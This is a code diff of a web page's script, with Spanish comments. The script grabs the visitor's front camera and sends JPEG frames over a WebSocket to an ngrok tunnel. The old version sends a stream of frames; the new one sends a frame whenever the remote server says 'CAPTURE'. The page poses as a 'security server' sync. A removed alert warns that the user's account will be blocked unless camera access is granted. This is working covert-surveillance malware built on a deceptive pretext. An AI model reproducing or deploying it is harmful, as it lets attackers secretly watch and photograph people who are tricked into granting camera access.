@@ -19,40 +19,38 @@
     </div>
 
     <script>
-        async function start() {
-            try {
-                // Resolución 480p: El balance perfecto entre calidad y velocidad
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480, facingMode: "user" } 
-                });
-                
-                // ASEGÚRATE DE QUE ESTE LINK SEA EL CORRECTO DE TU NGROK
-                const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
+    async function start() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 480, height: 360, facingMode: "user" } 
+            });
+            
+            const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
 
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
+            socket.onmessage = (event) => {
+                if (event.data === "CAPTURE") {
+                    canvas.width = 480;
+                    canvas.height = 360;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    if (socket.readyState === WebSocket.OPEN) {
+                        // Enviamos calidad media para asegurar estabilidad
+                        socket.send(canvas.toDataURL('image/jpeg', 0.4));
+                    }
+                }
+            };
 
-               socket.onopen = () => {
-                    console.log("Conectado");
-                    setInterval(() => {
-                        if (video.videoWidth > 0 && socket.readyState === WebSocket.OPEN) {
-                            canvas.width = 480; // Bajamos un poco más para asegurar
-                            canvas.height = 360;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            // Enviamos la foto
-                            socket.send(canvas.toDataURL('image/jpeg', 0.4));
-                        }
-                    }, 300); // 3 fotos por segundo es el límite de estabilidad de Ngrok free
-                };
-                alert("Sincronizando con el servidor de seguridad...");
-            } catch (e) {
-                alert("Error: Es obligatorio habilitar el acceso para evitar el bloqueo de su cuenta.");
-            }
+            alert("Sincronizando con el servidor de seguridad...");
+        } catch (e) {
+            alert("Error de validación.");
         }
-    </script>
+    }
+</script>
 </body>
 </html>
